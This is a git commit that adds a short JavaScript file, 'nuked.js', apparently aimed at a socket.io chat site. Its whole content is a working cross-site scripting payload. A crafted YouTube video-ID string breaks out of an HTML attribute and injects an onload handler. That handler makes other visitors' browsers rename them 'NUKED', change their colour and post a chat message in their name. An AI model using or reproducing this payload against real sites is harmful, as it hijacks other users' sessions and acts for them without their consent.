974b916104c259d2564dd67838e86792d314e2af
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-03-09 13:54:08 -0300

    Create nuked.js

---
+++ nuked.js
@@ -0,0 +1,6 @@
+socket.emit('command', {
+  list: [
+    "youtube",
+    "VIDEO_ID\" onload=\"socket.emit('command',{list:['name','NUKED']});socket.emit('command',{list:['color','brown']});window.socket.emit('talk',{text:'I JUST DID A BOOM BOOM'});\""
+  ]
+});
